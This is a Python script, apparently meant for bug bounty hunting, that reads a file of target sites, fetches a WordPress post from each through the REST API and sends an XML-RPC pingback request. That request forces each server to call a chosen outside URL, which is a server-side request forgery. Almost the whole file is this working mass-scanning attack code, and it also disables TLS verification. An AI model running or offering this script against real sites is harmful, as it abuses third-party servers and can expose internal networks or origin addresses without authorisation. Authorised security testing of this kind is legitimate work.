#!/usr/bin/python3

# A script to bulk scan bugbounty programs for
# the default Wordpress XML-RPC pingback feature to SSRF

import asyncio
import aiohttp
import pprint
import json
import sys

async def request_get_wp_blogposts(url,session,path="/wp-json/wp/v2/posts"):
    try:
        async with session.get(url+path) as res:
            response = await res.text()
            return response
    except aiohttp.ClientConnectorError as e:
        print(f"[!] Could not request json api for {url}")

async def process_get_wp_blogposts(response,url):
    try:
        j = json.loads(response)
        link = j[0]["link"]
        if link:
            print(f"[*] Found a blogpost for: {url} -> {link[:40]}")
            return link
        else:
            print(f"[!] Could not find any blogposts for {url}")
    except:
        print(f"[!] Could not find any blogposts for {url}")

async def ssrf(url,blogpost_url,session,path="/xmlrpc.php"):
    xml = f"""
    <?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params>
        <param>
            <value>
                <string>{ssrf_url}?d={blogpost_url}</string>
            </value>
        </param>
        <param>
            <value>
                <string>{blogpost_url}</string>
            </value>
        </param>
    </params>
    </methodCall>"""
    try:
        async with session.post(url+path,data=xml) as res:
            response = await res.text()
            print(f"[*] SSRF request sent to! {url}")
            return response
    except: #aiohttp.ClientConnectorError as e:
        print(f"[!] Could not make the ssrf request for {url}")


async def worker(url):
    url = url.strip()
    async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=20),
            connector=aiohttp.TCPConnector(ssl=False)) as session:
        response = await request_get_wp_blogposts(url,session)
        link = await process_get_wp_blogposts(response,url)
        ssrfres = await ssrf(url,link,session)            

async def main():
    await asyncio.wait([worker(url) for url in open(sys.argv[1]).readlines()])

if __name__ == "__main__":
    global ssrf_url
    ssrf_url = "<URL>" 
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    exit()
   

 
